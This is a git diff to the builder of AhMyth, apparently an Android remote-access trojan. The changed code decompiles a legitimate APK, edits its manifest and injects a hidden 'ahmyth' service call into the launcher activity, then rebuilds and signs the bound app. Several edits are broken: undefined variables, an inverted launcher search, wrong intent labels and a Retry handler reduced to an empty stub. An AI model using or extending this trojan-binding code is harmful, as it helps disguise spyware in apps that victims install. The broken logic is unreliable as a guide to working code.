@@ -196,7 +196,52 @@ app.controller("AppCtrl", ($scope) => {
             });
     }
 
+    // function rebuild the decompiled apk folder
+    $appCtrl.RebuildApk = (apkFolder) => {
 
+    appCtrl.Log('Building ' + filePath + apkFolder + '...');
+    var RebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
+        (error, stdout, stderr) => {
+            if (error !== null) {
+                $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
+                return;
+            }
+
+            $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
+            var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
+                (error, stdout, stderr) => {
+                    if (error !== null) {
+                        $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
+                        return;
+                    }
+
+
+                    fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
+                        if (err) throw err;
+
+                        $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
+                        $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
+                        exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && cd .. && cp Vault/AndroidManifest.xml.ahmyth Ahmyth/AndroidManifest.xml ")
+                    });
+                });
+        });
+    }
+
+    $appCtrl.Retry = (folder) => {
+      if (folder == -1) {
+        return;
+      }
+      
+      // generate a solid ahmyth apk
+      var filePath = $appCtrl.filePath;
+      if (filePath == null) {
+        $appCtrl.Log("Browse the apk folder which you want to rebuild", CONSTANTS.logStatus.FAIL);
+        return;
+      } else if (!filePath.includes(".*")) {
+        $appCtrl.Log("It is not a decompiled APK folder", CONSTANTS.logStatus.FAIL);
+        return;
+      }
+    }
 
     // function to build the apk and sign it
     $appCtrl.GenerateApk = (apkFolder) => {
@@ -2824,7 +2869,7 @@ app.controller("AppCtrl", ($scope) => {
                 }
                 })
         })
-        $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
+        appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
         var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '" --use-aapt "' + '"',
             (error, stdout, stderr) => {
                 if (error !== null) {
@@ -5519,14 +5564,12 @@ app.controller("AppCtrl", ($scope) => {
 
             var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
             if (launcherPath == -1) {
-              var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali_classes2/"));
-              if (launcherPath == -1) {
                 $appCtrl.Log("Cannot find the launcher activity,", CONSTANTS.logStatus.FAIL);
                 $appCtrl.Log("Please check the app by running", CONSTANTS.logStatus.FAIL);
                 $appCtrl.Log("aapt d badging 'path-to-your.apk' | grep launchable-activity", CONSTANTS.logStatus.INFO)
                 return;
               }
-            }
+            
 
             var ahmythService = CONSTANTS.ahmythService;
             $appCtrl.Log('Modifying AndroidManifest.xml...');
@@ -5551,7 +5594,7 @@ app.controller("AppCtrl", ($scope) => {
                     }
 
 
-                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/", "smali_classes2/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;
+                    var startService = CONSTANTS.serviceSrc + launcherPath.substring(launcherPath.indexOf("smali/") + 6, launcherPath.indexOf(".smali")) + CONSTANTS.serviceStart;
 
 
                     var key = CONSTANTS.orgAppKey;
@@ -5625,7 +5668,7 @@ app.controller("AppCtrl", ($scope) => {
 
                     var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                     $appCtrl.Log('Decompiling ' + filePath + "...");
-                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" --use-aapt "' + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
+                    var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                         (error, stdout, stderr) => {
                             if (error !== null) {
                                 $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
@@ -5668,8 +5711,12 @@ function GetLauncherPath(manifest, smaliPath) {
         indices.push(result.index);
     }
 
-    var indexOfLauncher = manifest.indexOf('category android:name="android.intent.category.LAUNCHER"') + manifest.indexOf('category android:name="android.intent.category.INFO"');
+    var indexOfLauncher = manifest.indexOf('<category android:name="android.intent.action.LAUNCHER" />'); 
     var indexOfActivity = -1;
+    if (indexOfLauncher != -1) {
+        var indexOfLauncher = manifest.indexOf('<category android:name="android.intent.action.INFO" />');
+        var indexOfActivity = -1
+    }
 
     if (indexOfLauncher != -1) {
         manifest = manifest.substring(0, indexOfLauncher);
@@ -5713,53 +5760,5 @@ function GetLauncherPath(manifest, smaliPath) {
   // new function to build and sign and apk from a decompiled folder state 
   // only to be fired when the user clicks the Retry button in the APK Builder page
   
-  $appCtrl.BuildFromDecompiled = (decompiledFolder) => {
-    var decompiledFolder = filePath;
-    $appCtrl.RebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + decompiledFolder + '" -o "' + outputPath + '"',
-        (error, stdout, stderr) => {
-          if (error !== null) {
-            $appCtrl.Log('Rebuilding Failed', CONSTANTS.logStatus.FAIL);
-            return;
-          }
-
-          $appCtrl.Log('Rebuilding Successful', CONSTANTS.logStatus.SUCCESS);
-          $appCtrl.Log('Signing APK...');
-          var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(CONSTANTS.outputPath, CONSTANTS.signedApkName) + '" -p "' + CONSTANTS.keystorePath + '" -k "' + CONSTANTS.keystorePassword + '" -i "' + CONSTANTS.keystoreAlias + '" -s "' + CONSTANTS.keystoreAliasPassword + '" "' + path.join(CONSTANTS.outputPath, CONSTANTS.apkName) + '"',
-              (error, stdout, stderr) => {
-                if (error !== null) {
-                  $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
-                  return;
-                }
-
-                $appCtrl.Log('Signing Successful', CONSTANTS.logStatus.SUCCESS);
-                $appCtrl.Log('The APK has been built on ', path.join(CONSTANTS.outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
-                
-                // collect the path to the decompiledFolder from the dialog and start building 
-                // the apk from the decompiled folder
-                
-                $appCtrl.Retry = (filePath) => {
-                  if (!filePath == null) {
-                    $appCtrl.Log("Browse a decompiled folder", CONSTANTS.logStatus.FAIL);
-                    return;
-                  } else if (!filePath) {
-                    filePath = decompiledFolder
-                  } else if (!filePath.includes(".apk")) {
-                    $appCtrl.Log("It is not a decompiled folder", CONSTANTS.logStatus.FAIL);
-                    return;
-                  }
-                  // check that bind apk is enabled
-                  if (!$appCtrl.bindApk.enable) {
-                    $appCtrl.Log("Binding is disabled, Please enable it", CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log("by ticking the checkbox.", CONSTANTS.logStatus.FAIL);
-                    return;
-                  }
-                  // disreguard whatever binding method is enabled
-                  $appCtrl.bindApk.method = 'NONE'; 
-                  
-                  // build the apk from the decompiled folder
-                  $appCtrl.BuildFromDecompiled(filePath);
-                }
-              });
-
-        });
-  }
+  // targets the apk folder select with the dialog
+  // and then build the apk
